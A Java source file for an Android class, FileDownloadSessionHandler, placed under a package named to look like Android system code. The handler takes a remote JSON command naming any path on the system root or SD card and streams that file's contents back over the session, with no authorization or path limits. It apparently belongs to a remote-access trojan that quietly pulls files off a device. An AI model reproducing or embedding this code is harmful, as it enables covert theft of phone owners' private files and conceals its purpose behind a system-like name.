package com.android.system.session.handler;

import android.os.Environment;

import com.android.system.session.SessionManager;
import com.android.system.utils.DataPack;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;

public class FileDownloadSessionHandler implements SessionManager.SessionHandler  {
    public void handleSession(String sessionName, InputStream inputStream, OutputStream outputStream) {
        byte[] receiveData = DataPack.receiveDataPack(inputStream);
        if(receiveData == null) {
            return;
        }
        String command = null;
        try {
            command = new String(receiveData, "UTF-8");
        } catch (UnsupportedEncodingException e) {
            command = new String(receiveData);
        }
        JSONObject jsonObject = null;
        try {
            jsonObject = new JSONObject(command);
        } catch (JSONException e) {
            return;
        }

        String path="";
        try {
            path = jsonObject.getString("path");
        } catch (JSONException e) {
            e.printStackTrace();
        }
        path = path.replace("<ROOT>",Environment.getRootDirectory().getAbsolutePath()).replace("<SD>", Environment.getExternalStorageDirectory().getAbsolutePath());
        File file = new File(path);
        if(file.isFile()) {
            InputStream is = null;
            try {
                is = new FileInputStream(file);
                byte[] buffer = new byte[1024 * 1024 * 32];
                while(true) {
                    int readLength = is.read(buffer);
                    if(readLength <= 0) {
                        break;
                    }
                    outputStream.write(buffer,0,readLength);
                }
                return;
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                if(is!=null) {
                    try {
                        is.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
        }
    }
}
